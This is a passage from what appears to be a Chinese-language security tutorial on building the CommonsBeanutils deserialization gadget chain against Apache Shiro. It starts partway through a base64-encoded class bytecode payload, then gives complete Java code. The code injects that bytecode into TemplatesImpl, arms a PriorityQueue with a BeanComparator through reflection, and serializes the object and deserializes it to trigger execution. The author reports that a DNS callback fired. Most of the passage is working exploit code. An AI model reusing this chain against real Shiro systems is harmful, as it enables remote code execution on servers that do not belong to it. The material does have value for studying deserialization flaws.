AAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        BeanComparator beanComparator = new BeanComparator("outputProperties", String.CASE_INSENSITIVE_ORDER);
        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class<?> clazzPriorityQueue = priorityQueue.getClass();
        Field field = clazzPriorityQueue.getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, beanComparator);
        Field fieldQueue = clazzPriorityQueue.getDeclaredField("queue");
        fieldQueue.setAccessible(true);
        Object[] internalQueue = (Object[]) fieldQueue.get(priorityQueue);
        internalQueue[0] = templatesImpl;
        internalQueue[1] = templatesImpl;
        serializeObject(priorityQueue);
        unSerializeObject("ser.bin");
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

执行后，成功触发 DNS 请求，如下-->

![](image-48.png)

至此，成功构造出一条无需额外依赖的 Shiro 反序列化利用链-->CommonsBeanutils 链。